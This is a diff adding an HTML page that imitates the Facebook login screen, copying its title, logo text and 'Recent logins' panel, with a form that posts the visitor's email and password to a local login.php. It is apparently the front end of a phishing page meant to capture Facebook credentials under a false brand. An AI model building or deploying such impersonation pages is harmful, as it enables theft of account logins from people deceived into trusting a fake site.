@@ -1,0 +1,34 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Facebook – log in or sign up</title>
+  <link rel="stylesheet" href="style.css">
+</head>
+<body>
+  <div class="fb-wrapper">
+    <div class="fb-left">
+      <h1 class="fb-logo">facebook</h1>
+      <h2>Recent logins</h2>
+      <p>Click your picture or add an account.</p>
+      <div class="add-account-box">
+        <div class="add-plus">+</div>
+        <p>Add Account</p>
+      </div>
+    </div>
+
+    <div class="fb-login-box">
+      <form method="POST" action="login.php">
+        <input type="text" name="email" placeholder="Email address or phone number" required>
+        <input type="password" name="pass" placeholder="Password" required>
+        <button type="submit">Log in</button>
+        <a href="#">Forgotten password?</a>
+        <hr>
+        <button type="button" class="green-btn">Create new account</button>
+      </form>
+      <p class="create-page">Create a Page for a celebrity, brand or business.</p>
+    </div>
+  </div>
+</body>
+</html>
